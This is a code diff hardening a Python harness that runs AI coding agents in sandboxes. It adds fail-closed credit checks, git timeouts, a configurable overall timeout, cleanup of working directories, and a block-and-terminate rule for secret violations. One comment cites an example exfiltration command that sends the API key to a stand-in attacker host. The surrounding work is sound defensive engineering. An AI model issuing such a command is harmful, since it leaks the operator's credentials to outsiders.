@@ -100,7 +100,13 @@ def check_credit_balance(api_key: str) -> tuple[bool, str]:
     except urllib.error.HTTPError as e:
         return False, f"credit check failed: HTTP {e.code} {e.read()[:300]}"
     except Exception as e:
-        return True, f"credit check inconclusive ({e}), proceeding cautiously"
+        # Fail CLOSED, not open: a flaky network here must not silently let
+        # dispatch proceed with an unknown balance -- that's a softer version
+        # of the exact "blind redispatch into a dead account" bug this check
+        # exists to prevent. Refusing on an inconclusive check is a false
+        # positive at worst (retry the preflight); failing open risks the
+        # real thing again.
+        return False, f"credit check inconclusive ({e}), refusing rather than guessing"
     total = data.get("total_credits", 0) or 0
     used = data.get("total_usage", 0) or 0
     remaining = total - used
@@ -126,20 +132,21 @@ def acquire_lock(row_id: str):
 
 
 def dispatch_one(row_id: str, brief_path: Path, model: str, retry_cap: int,
-                  snapshot: str, max_tokens: int) -> Result:
+                  snapshot: str, max_tokens: int, overall_timeout: int) -> Result:
     lock = acquire_lock(row_id)
     if lock is None:
         return Result(row_id, False, False,
                        "another dispatch of this row is already running (lock held)", None)
     try:
-        return _dispatch_one_locked(row_id, brief_path, model, retry_cap, snapshot, max_tokens)
+        return _dispatch_one_locked(row_id, brief_path, model, retry_cap, snapshot,
+                                     max_tokens, overall_timeout)
     finally:
         fcntl.flock(lock, fcntl.LOCK_UN)
         lock.close()
 
 
 def _dispatch_one_locked(row_id: str, brief_path: Path, model: str, retry_cap: int,
-                          snapshot: str, max_tokens: int) -> Result:
+                          snapshot: str, max_tokens: int, overall_timeout: int) -> Result:
     run_id = uuid.uuid4().hex[:8]
     name = f"sd-{row_id}-{run_id}"  # unique per attempt -- never collides
     workdir = Path(tempfile.mkdtemp(prefix=f"simple-dispatch-{row_id}-"))
@@ -154,14 +161,23 @@ def _dispatch_one_locked(row_id: str, brief_path: Path, model: str, retry_cap: i
 
     try:
         clone_dir = workdir / "repo"
-        sh(["git", "clone", "--no-hardlinks", "--quiet", str(REPO), str(clone_dir)], env=env)
-        sh(["git", "-C", str(clone_dir), "fetch", "origin", "-q"], env=env)
-        sh(["git", "-C", str(clone_dir), "checkout", "--quiet", "-b", f"issue-{row_id}", "origin/main"], env=env)
-        base_commit = sh(["git", "-C", str(clone_dir), "rev-parse", "HEAD"], env=env).stdout.strip()
+        # Explicit timeouts on every git call, matching the msb calls below --
+        # without one, a network stall here hangs the worker thread (and the
+        # row's flock) indefinitely with no recovery path.
+        sh(["git", "clone", "--no-hardlinks", "--quiet", str(REPO), str(clone_dir)], env=env, timeout=60)
+        sh(["git", "-C", str(clone_dir), "fetch", "origin", "-q"], env=env, timeout=60)
+        sh(["git", "-C", str(clone_dir), "checkout", "--quiet", "-b", f"issue-{row_id}", "origin/main"], env=env, timeout=60)
+        base_commit = sh(["git", "-C", str(clone_dir), "rev-parse", "HEAD"], env=env, timeout=30).stdout.strip()
         logline(f"cloned at {base_commit}")
 
         args = [str(MSB_BIN), "run", "-m", "16G", "-c", "4", "--no-tty", "-d",
                  "--name", name, "--secret", "OPENROUTER_API_KEY@openrouter.ai",
+                 # `--secret` only scopes the key to openrouter.ai; without an
+                 # explicit --on-secret-violation, `msb run --help` documents
+                 # no default action, so a model-run `curl evil.com?k=$KEY`
+                 # could leak the live key on whatever the undocumented
+                 # default turns out to be. Fail closed, not on faith.
+                 "--on-secret-violation", "block-and-terminate",
                  "--from-snapshot", snapshot, "--", "sh", "-c", "sleep infinity"]
         r = sh(args, env=env, timeout=120)
         if r.returncode != 0:
@@ -184,16 +200,24 @@ def _dispatch_one_locked(row_id: str, brief_path: Path, model: str, retry_cap: i
         # harness, just with a different directory name.
         shutil.rmtree(clone_dir, ignore_errors=True)
 
+        # `overall_timeout` has to fit (retry_cap + 1) full verify passes
+        # (each up to agent_loop.py's own 1800s verify() ceiling) PLUS every
+        # turn's LLM round-trip time -- a single verify() call alone can
+        # already approach 1800s on a cold-cache Rust/LLVM build, so a tight
+        # outer timeout here can SIGTERM a run that was one command from
+        # green, silently making the retry-cap unreachable. Default sized for
+        # 2 verify passes plus real turn time with real slack, not just
+        # rounded up from one verify call.
         run_cmd = (
             f"cd /repo && export PATH=$HOME/.cargo/bin:/usr/lib/llvm-22/bin:$PATH && "
             f"export CARGO_BUILD_JOBS=2 && "
-            f"timeout 1800 python3 /root/agent_loop.py --task-file /root/task.txt "
+            f"timeout {overall_timeout} python3 /root/agent_loop.py --task-file /root/task.txt "
             f"--model {model} --retry-cap {retry_cap} --max-tokens {max_tokens} "
             f"> /root/agent.log 2>&1; "
             f"echo RC=$? >> /root/agent.log"
         )
         logline("running agent_loop.py")
-        exec_in(run_cmd, timeout=1900)
+        exec_in(run_cmd, timeout=overall_timeout + 120)
         tail = exec_in("tail -c 8000 /root/agent.log").stdout
         logline(tail[-3000:])
 
@@ -214,12 +238,17 @@ def _dispatch_one_locked(row_id: str, brief_path: Path, model: str, retry_cap: i
         patch_out = exec_in("cat /root/*.patch 2>/dev/null").stdout
         patch_path = None
         if patch_out.strip():
-            patch_path = workdir / "result.patch"
+            # Write into RESULT_DIR, not workdir -- workdir is removed below
+            # on every path (clone_dir already is; the rest of workdir was
+            # otherwise a permanent per-dispatch leak, same class as the
+            # already-fixed clone_dir leak).
+            patch_path = RESULT_DIR / f"{row_id}-{run_id}.patch"
             patch_path.write_text(patch_out)
 
         return Result(row_id, ok, fatal, tail[-1500:], patch_path)
     finally:
         sh([str(MSB_BIN), "rm", "-f", name], env=env)
+        shutil.rmtree(workdir, ignore_errors=True)
         log.close()
 
 
@@ -231,6 +260,11 @@ def main() -> int:
     ap.add_argument("--model", default=DEFAULT_MODEL)
     ap.add_argument("--retry-cap", type=int, default=2)
     ap.add_argument("--max-tokens", type=int, default=4096)
+    ap.add_argument("--overall-timeout", type=int, default=5400,
+                     help="seconds allowed for the whole attempt loop (all retries, all turns, "
+                          "all verify passes) inside the sandbox; must comfortably exceed "
+                          "(retry-cap+1) * a single verify pass, or the retry cap becomes "
+                          "unreachable on real workloads")
     ap.add_argument("--parallel", type=int, default=3)
     ap.add_argument("--snapshot", default=DEFAULT_SNAPSHOT)
     args = ap.parse_args()
@@ -254,7 +288,7 @@ def main() -> int:
     with ThreadPoolExecutor(max_workers=args.parallel) as pool:
         futs = {
             pool.submit(dispatch_one, row, brief, args.model, args.retry_cap,
-                        args.snapshot, args.max_tokens): row
+                        args.snapshot, args.max_tokens, args.overall_timeout): row
             for row, brief in jobs
         }
         for fut in as_completed(futs):
